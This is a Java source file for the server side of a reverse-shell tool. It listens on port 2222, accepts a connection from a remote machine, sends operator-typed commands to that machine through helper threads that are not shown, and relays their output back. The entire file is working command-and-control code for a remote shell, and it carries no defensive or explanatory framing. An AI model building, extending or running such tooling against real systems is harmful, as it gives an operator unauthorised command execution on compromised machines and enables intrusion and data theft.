package obs1d1anc1ph3r.reverseshell.server;

import java.io.*;
import java.net.*;
import java.util.logging.*;

public class ReverseShellServer {

    private static final int SERVER_PORT = 2222;
    private static final Logger logger = Logger.getLogger(ReverseShellServer.class.getName());
    private ServerSocket serverSocket;
    private Socket clientSocket;
    private DataInputStream dataIn;
    private DataOutputStream dataOut;
    private BufferedReader userInput;
    private Thread outputReceiver;
    private Thread inputHandler;

    public static void main(String[] args) {
        ReverseShellServer server = new ReverseShellServer();
        server.start();
    }

    public void start() {
        try {
            setupServer();
            waitForConnection();
            setupStreams();

            outputReceiver = new Thread(new ResponseHandler(dataIn, dataOut, clientSocket));
            outputReceiver.start();

            inputHandler = new Thread(new CommandSender(dataOut, userInput, this));
            inputHandler.start();

        } catch (IOException e) {
            logger.log(Level.SEVERE, "[ERROR] Server error: " + e.getMessage(), e);
        }
    }

    private void setupServer() throws IOException {
        serverSocket = new ServerSocket(SERVER_PORT);
        logger.log(Level.INFO, "[-] Server is running on port {0}", SERVER_PORT);
    }

    private void waitForConnection() throws IOException {
        logger.info("[-] Waiting for incoming connection...");
        clientSocket = serverSocket.accept();
        logger.log(Level.INFO, "[-*] Connection established with {0}", clientSocket.getInetAddress());
    }

    private void setupStreams() throws IOException {
        dataIn = new DataInputStream(clientSocket.getInputStream());
        dataOut = new DataOutputStream(clientSocket.getOutputStream());
        userInput = new BufferedReader(new InputStreamReader(System.in));
    }

    public Socket getClientSocket() {
        return clientSocket;
    }

    public void cleanup() {
        try {
            if (outputReceiver != null && outputReceiver.isAlive()) {
                outputReceiver.interrupt();
            }
            if (inputHandler != null && inputHandler.isAlive()) {
                inputHandler.interrupt();
            }
            closeResources();
        } catch (IOException e) {
            logger.log(Level.SEVERE, "[ERROR] Error during cleanup: " + e.getMessage(), e);
        }
    }

    private void closeResources() throws IOException {
        try {
            if (userInput != null) {
                userInput.close();
            }
            if (dataIn != null) {
                dataIn.close();
            }
            if (dataOut != null) {
                dataOut.close();
            }
            if (clientSocket != null) {
                clientSocket.close();
            }
            if (serverSocket != null) {
                serverSocket.close();
            }
        } catch (IOException e) {
            logger.log(Level.SEVERE, "[ERROR] Error closing resources: " + e.getMessage(), e);
            throw e;
        }
    }
}
